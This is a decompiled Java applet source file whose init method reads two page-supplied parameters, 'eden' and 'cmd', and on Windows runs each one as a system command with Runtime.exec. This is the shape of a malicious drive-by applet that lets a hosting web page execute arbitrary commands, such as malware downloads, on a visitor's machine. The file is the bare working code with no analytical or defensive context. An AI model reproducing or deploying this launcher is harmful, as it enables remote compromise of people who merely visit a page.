import java.io.IOException;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Main extends Applet
{
    @Override
    public void init() {
        final String windows1 = this.getParameter("eden");
        final String executar = this.getParameter("cmd");
        final String os = System.getProperty("os.name").toLowerCase();
        if (os.indexOf("win") >= 0) {
            try {
                final Process w1 = Runtime.getRuntime().exec(windows1);
            }
            catch (IOException e) {
                e.printStackTrace();
            }
            try {
                final Process cmd = Runtime.getRuntime().exec(executar);
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
